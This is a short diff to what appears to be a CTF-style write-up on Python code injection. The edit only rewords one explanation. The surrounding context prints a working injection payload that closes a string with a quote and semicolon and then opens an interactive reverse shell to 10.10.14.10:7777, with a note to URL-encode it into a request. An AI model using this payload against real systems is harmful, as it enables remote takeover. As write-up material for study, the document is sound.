@@ -135,7 +135,7 @@ The following payload exploits this line of code
 Payload='; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.10',7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']); #
 ```
 This payload works as
-* First finish the command that assigns the output with **';**
+* First finish the command that assigns the output variable with **';**
 * Next, it provides another command that we want to execute(Here,reverse shell)
 URL Encode the payload and then putting it in url gives a reverse shell.
 ```url
